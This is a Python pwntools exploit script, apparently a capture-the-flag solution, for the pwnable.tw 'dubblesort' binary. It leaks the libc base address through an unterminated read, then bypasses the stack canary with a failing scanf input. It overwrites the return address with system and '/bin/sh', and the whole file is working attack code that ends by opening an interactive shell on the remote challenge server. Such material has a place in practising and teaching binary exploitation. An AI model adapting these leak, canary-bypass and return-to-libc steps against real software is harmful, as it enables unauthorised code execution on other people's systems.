#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/dubblesort'
REMOTE = ['chall.pwnable.tw', 10101]

LIBC = ELF('./files/libc_32.so.6')

ENV = {'LD_PRELOAD': LIBC.path}
_LD = './files/ld-2.23.so'

context.binary = LOCALE
context.binary.checksec()
context.terminal = ['tmux', 'splitw', '-h'] 

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process([_LD, LOCALE], env=ENV)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################

# gdb.attach(p, 'fin\nfin\n')

with log.progress('Leaking libc base address') as l:
    padding = 'AAAA' * 7
    p.sendafter(':', padding + 'A')
    
    # Stack after this read:
    #                         +===========================+
    #                         | The extra 'A' avoids \x00 |
    #                         +===========================+
    #                                       |
    #                                       |  0x41414141
    # 0x41414141  0x41414141  0x41414141    |  0x41414141
    # 0x41414141  0x41414141  0x______41 <--+  __________
    # __________  __________  __________       __________
    # __________  __________  __________       ~ CANARY ~
    
    p.recvuntil(padding)

    LIBC_BASE = (u32(p.recv(4)) & 0xfffff000) - 0x1ae000
    
    l.success(hex(LIBC_BASE))

SYSTEM = LIBC_BASE + LIBC.symbols['system']
BIN_SH = LIBC_BASE + LIBC.search('/bin/sh').next()

# |                       |
# |          ...          |
# |                       |
# |  8w   (array to sort) | 
# | 16w            (name) | 
# |  1w    (stack canary) |
# |  7w         (padding) |
# |  1w          (system) |
# |  1w             (...) |
# |  1w         (/bin/sh) |
# |                       |
# |          ...          |
# |                       |

TOTAL = 8 + 16 + 1 + 7 + 1 + 2

with log.progress('Overwriting ret-addr with system (0x%x)' % SYSTEM) as l:
    p.sendlineafter('sort :', str(TOTAL))

    for _ in range(8 + 16):
        l.status('%2i/24' % (_ + 1))
        p.sendlineafter('number : ', str(0))

    # Let ``scanf("%u", ...)`` fail so the canary is left unchanged
    p.sendlineafter('number : ', '+')

    for _ in range(7):
        l.status('%2i/7' % (_ + 1))
        p.sendlineafter('number : ', str(LIBC_BASE))

    p.sendlineafter('number : ', str(SYSTEM))

    p.sendlineafter('number : ', str(SYSTEM + 0x123))
    p.sendlineafter('number : ', str(BIN_SH))

    l.success()

# Let the program sort the payload
p.recvuntil('%d ' % BIN_SH)

p.interactive()
p.close()
